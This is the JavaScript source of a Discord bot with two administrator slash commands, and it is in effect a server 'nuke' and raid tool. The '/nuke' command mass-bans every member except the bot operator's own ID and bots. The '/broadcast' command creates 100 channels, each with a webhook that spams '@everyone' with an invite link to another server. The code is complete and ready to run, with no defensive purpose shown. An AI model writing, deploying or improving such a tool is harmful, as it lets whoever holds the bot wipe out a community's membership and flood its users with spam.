const express = require('express');
const { 
  Client, 
  GatewayIntentBits, 
  Partials, 
  SlashCommandBuilder, 
  REST, 
  Routes, 
  PermissionFlagsBits, 
  ChannelType 
} = require('discord.js');
require('dotenv').config();

// Start web server for Render
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is running'));
app.listen(PORT, () => console.log(`🌐 Web server live on port ${PORT}`));

// Discord client setup
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

const bannedUsers = new Set();

client.once('ready', async () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);

  const commands = [
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all members (except owner & bots)')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('broadcast')
      .setDescription('Create 100 channels with webhooks to ping @everyone')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON()
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(
    Routes.applicationGuildCommands(client.user.id, process.env.GUILD_ID),
    { body: commands }
  );

  console.log('✅ Slash commands registered');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const guild = interaction.guild;

  // /nuke command
  if (interaction.commandName === 'nuke') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
    }

    await interaction.reply('⚠️ Confirm nuke? Type `CONFIRM` within 15 seconds.');

    const filter = m => m.author.id === interaction.user.id && m.content === 'CONFIRM';
    try {
      await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });

      const members = await guild.members.fetch();
      for (const [id, member] of members) {
        if (id === process.env.OWNER_ID || member.user.bot) continue;

        try {
          if (!bannedUsers.has(id)) {
            await member.ban({ reason: 'Cleanup command' });
            bannedUsers.add(id);
            console.log(`🔨 Banned ${member.user.tag}`);
          }
        } catch (err) {
          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
        }
      }

      interaction.followUp('✅ Nuke complete.');
    } catch {
      interaction.followUp('❌ Nuke cancelled or timed out.');
    }
  }

  // /broadcast command
  if (interaction.commandName === 'broadcast') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
    }

    await interaction.reply('📡 Starting broadcast...');

    for (let i = 1; i <= 100; i++) {
      try {
        const channel = await guild.channels.create({
          name: `vanir-${i}`,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: ['ViewChannel', 'SendMessages'],
            },
          ],
        });

        const webhook = await channel.createWebhook({
          name: `VanirWebhook-${i}`,
          avatar: client.user.displayAvatarURL(),
        });

        await webhook.send({
          content: `@everyone https://discord.gg/vanir`,
          allowedMentions: { parse: ['everyone'] }
        });

        console.log(`✅ Created channel & webhook: vanir-${i}`);
        await new Promise(res => setTimeout(res, 500)); // Prevent rate limits
      } catch (err) {
        console.error(`❌ Error on vanir-${i}: ${err.message}`);
      }
    }

    interaction.followUp('✅ Broadcast finished.');
  }
});

client.login(process.env.TOKEN);
